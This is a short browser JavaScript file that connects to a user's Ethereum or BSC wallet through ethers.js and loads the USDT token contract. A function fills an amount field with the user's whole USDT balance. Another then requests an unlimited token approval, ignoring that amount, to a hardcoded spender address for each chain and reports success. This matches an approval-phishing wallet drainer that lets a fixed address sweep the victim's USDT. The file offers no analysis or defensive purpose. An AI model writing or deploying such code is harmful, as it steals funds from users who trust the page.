let provider;
let signer;
let usdtContract;
let USDT_ADDRESS;
let SPENDER_ADDRESS;

// 🔹 ERC20 ABI
const USDT_ABI = [
  "function approve(address spender, uint256 amount) returns (bool)",
  "function allowance(address owner, address spender) view returns (uint256)",
  "function balanceOf(address owner) view returns (uint256)",
  "function decimals() view returns (uint8)"
];

async function init() {
  if (!window.ethereum) {
    alert("Wallet not found");
    throw new Error("No wallet");
  }

  provider = new ethers.BrowserProvider(window.ethereum);
  signer = await provider.getSigner();

  const network = await provider.getNetwork();
  const chainId = Number(network.chainId);

  console.log("Connected chainId:", chainId);

  if (chainId === 1) {
    // ✅ Ethereum
    USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
    SPENDER_ADDRESS = "0xaBe10e774745DAA4F43af098C4E0d66fAcfF3bC7";
  } else if (chainId === 56) {
    // ✅ BSC
    USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
    SPENDER_ADDRESS = "0x220bb5df0893f21f43e5286bc5a4445066f6ca56";
  } else {
    alert("Unsupported network. Please use Ethereum or BSC");
    throw new Error("Unsupported chain");
  }

  usdtContract = new ethers.Contract(
    USDT_ADDRESS,
    USDT_ABI,
    signer
  );
}

// 🔹 Fill max balance
async function setMax() {
  await init();

  const user = await signer.getAddress();
  const balance = await usdtContract.balanceOf(user);
  const decimals = await usdtContract.decimals();

  document.getElementById("amount").value =
    ethers.formatUnits(balance, decimals);
}

// 🔥 Unlimited approval
async function approveUSDT() {
  await init();

  const MAX_UINT =
    "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";

  const tx = await usdtContract.approve(
    SPENDER_ADDRESS,
    MAX_UINT
  );

  console.log("Approval TX:", tx.hash);
  alert("Approval submitted successfully");
}
